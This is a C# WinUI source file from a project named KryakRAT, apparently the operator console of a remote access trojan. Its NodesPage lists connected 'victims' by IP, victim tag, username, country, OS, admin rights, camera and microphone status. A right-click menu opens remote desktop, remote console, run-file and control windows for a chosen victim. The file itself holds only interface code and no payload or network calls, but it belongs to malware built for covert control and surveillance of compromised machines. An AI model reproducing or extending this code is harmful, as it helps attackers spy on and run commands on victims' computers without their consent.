using KryakRAT.Controls;
using KryakRAT.Services;
using Microsoft.UI.Xaml.Controls;
using KryakRAT.Windows;
using Microsoft.UI.Xaml;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;

namespace KryakRAT.Pages
{
    public sealed partial class NodesPage : Page
    {
        private readonly List<Window> _openedWindows = [];
        private readonly Dictionary<UserData, List<Window>> _userWindows = [];
        private readonly Dictionary<Window, UserData> _windowUsers = [];

        public NodesPage()
        {
            InitializeComponent();

            SetupGrid();
            SetupGridEvents();

            if (App.MainWindow is not null)
            {
                App.MainWindow.Closed += MainWindow_Closed;
            }

            App.Server.UserDisconnected += Server_UserDisconnected;

            Unloaded += NodesPage_Unloaded;
        }

        private void SetupGrid()
        {
            PeopleGrid.Columns = new ObservableCollection<DataGridColumnDefinition>
            {
                new() { Header = "IP", PropertyName = nameof(UserData.UserIPAddress) },
                new() { Header = "Tag", PropertyName = nameof(UserData.VictimTag) },
                new() { Header = "Username", PropertyName = nameof(UserData.Username) },
                new() { Header = "Country", PropertyName = nameof(UserData.Country) },
                new() { Header = "OS", PropertyName = nameof(UserData.UserOS) },
                new() { Header = "Admin", PropertyName = nameof(UserData.AdminStatus) },
                new() { Header = "Cam", PropertyName = nameof(UserData.CameraStatus) },
                new() { Header = "Mic", PropertyName = nameof(UserData.MicrophoneStatus) },
                new() { Header = "Ping", PropertyName = nameof(UserData.Ping) }
            };

            PeopleGrid.Items = App.ConnectedUsers.Users;
        }

        private void SetupGridEvents()
        {
            PeopleGrid.RowRightClick += PeopleGrid_RowRightClick;
        }

        private void PeopleGrid_RowRightClick(object? sender, CustomDataGridRowRightClickEventArgs e)
        {
            if (e.RowItem is not UserData row)
            {
                return;
            }

            MenuFlyout menu = CreateRowMenu(row);
            ProtectedCursor = null;
            menu.ShowAt(PeopleGrid, e.Position);
        }

        private MenuFlyout CreateRowMenu(UserData row)
        {
            MenuFlyout menu = new();

            MenuFlyoutItem ManagerItem = new()
            {
                Text = "Manager",
                Icon = new SymbolIcon(Symbol.Contact)
            };
            ManagerItem.Click += (_, _) => Manager(row);

            MenuFlyoutItem RemoteDesktopItem = new()
            {
                Text = "Remote desktop",
                Icon = new SymbolIcon(Symbol.Remote)
            };
            RemoteDesktopItem.Click += (_, _) => RemoteDesktop(row);

            MenuFlyoutItem RemoteConsoleItem = new()
            {
                Text = "Remote console",
                Icon = new SymbolIcon(Symbol.AllApps)
            };
            RemoteConsoleItem.Click += (_, _) => RemoteConsole(row);

            MenuFlyoutItem RunFileItem = new()
            {
                Text = "Run file",
                Icon = new SymbolIcon(Symbol.OpenFile)
            };
            RunFileItem.Click += (_, _) => RunFile(row);

            MenuFlyoutItem ControlItem = new()
            {
                Text = "Control",
                Icon = new SymbolIcon(Symbol.World)
            };
            ControlItem.Click += (_, _) => Control(row);

            //menu.Items.Add(ManagerItem);
            menu.Items.Add(RemoteDesktopItem);
            menu.Items.Add(RemoteConsoleItem);
            menu.Items.Add(RunFileItem);
            menu.Items.Add(ControlItem);

            return menu;
        }

        private void Manager(UserData user)
        {

        }
        private void RemoteDesktop(UserData user)
        {
            OpenUserWindow(user, new RemoteDesktopWindow(user));
        }
        private void RemoteConsole(UserData user)
        {
            OpenUserWindow(user, new RemoteConsoleWindow(user));
        }
        private void RunFile(UserData user)
        {
            OpenUserWindow(user, new RunFileWindow(user));
        }
        private void Control(UserData user)
        {
            OpenUserWindow(user, new ClientControlWindow(user));
        }

        private void OpenUserWindow(UserData user, Window window)
        {
            window.Closed += ChildWindow_Closed;

            _openedWindows.Add(window);
            _windowUsers[window] = user;

            if (!_userWindows.TryGetValue(user, out List<Window>? windows))
            {
                windows = [];
                _userWindows[user] = windows;
            }

            windows.Add(window);

            window.Activate();
        }

        private void ChildWindow_Closed(object sender, WindowEventArgs args)
        {
            if (sender is not Window window)
                return;

            window.Closed -= ChildWindow_Closed;

            _openedWindows.Remove(window);

            if (!_windowUsers.Remove(window, out UserData? user))
                return;

            if (_userWindows.TryGetValue(user, out List<Window>? windows))
            {
                windows.Remove(window);

                if (windows.Count == 0)
                {
                    _userWindows.Remove(user);
                }
            }
        }

        private void Server_UserDisconnected(UserData user)
        {
            if (!DispatcherQueue.HasThreadAccess)
            {
                DispatcherQueue.TryEnqueue(() => Server_UserDisconnected(user));
                return;
            }

            if (!_userWindows.Remove(user, out List<Window>? windows))
                return;

            foreach (Window window in windows.ToArray())
            {
                _windowUsers.Remove(window);
                _openedWindows.Remove(window);

                window.Closed -= ChildWindow_Closed;
                window.Close();
            }
        }

        private void MainWindow_Closed(object sender, WindowEventArgs args)
        {
            foreach (Window window in _openedWindows.ToArray())
            {
                window.Closed -= ChildWindow_Closed;
                window.Close();
            }

            _openedWindows.Clear();
            _windowUsers.Clear();
            _userWindows.Clear();
        }

        private void NodesPage_Unloaded(object sender, RoutedEventArgs e)
        {
            if (App.MainWindow is not null)
            {
                App.MainWindow.Closed -= MainWindow_Closed;
            }

            App.Server.UserDisconnected -= Server_UserDisconnected;

            Unloaded -= NodesPage_Unloaded;
        }
    }
}
